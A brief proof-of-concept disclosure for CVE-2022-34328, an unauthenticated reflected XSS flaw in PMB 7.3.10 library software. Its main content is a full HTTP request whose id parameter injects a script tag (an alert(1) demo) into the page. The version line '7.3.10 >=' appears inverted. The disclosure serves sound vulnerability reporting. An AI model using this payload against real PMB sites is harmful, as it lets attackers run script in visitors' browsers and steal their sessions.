## PMB  7.3.10 - CVE-2022-34328 

* Description : Allow attacker to inject arbitrary malicious HTML or Javascripts code in user web browser
* Affected version :  7.3.10 >=

### Information

To make this PoC, I just installed the software (`https://forge.sigb.net/projects/pmb/files`)

* Vulnerability Type : XSS Reflected ( Unauthentificated )

### POC 

There is an exemple with alert: 

```
GET /index.php?lvl=author_see&id=42691%27%7cecho%20%3E%3C/a%3E%3C/span%3E%3Cscript%3Ealert(1)%3C/script%3Ed5u3g%20ijwh7gefly%20%23xzwx HTTP/1.1
Host: xxxxx.fr
Cookie: PhpMyBibli-OPACDB=pmb_test; _ga=GA1.2.80710046205; __utmz=147501360.tmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=147501632.2; PhpMyBibli-COOKIECONSENT=!pmbstatopac=true
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

### Preview 

<img width="1280" alt="poc-xss" src="https://raw.githubusercontent.com/jenaye/PMB/main/poc.png">
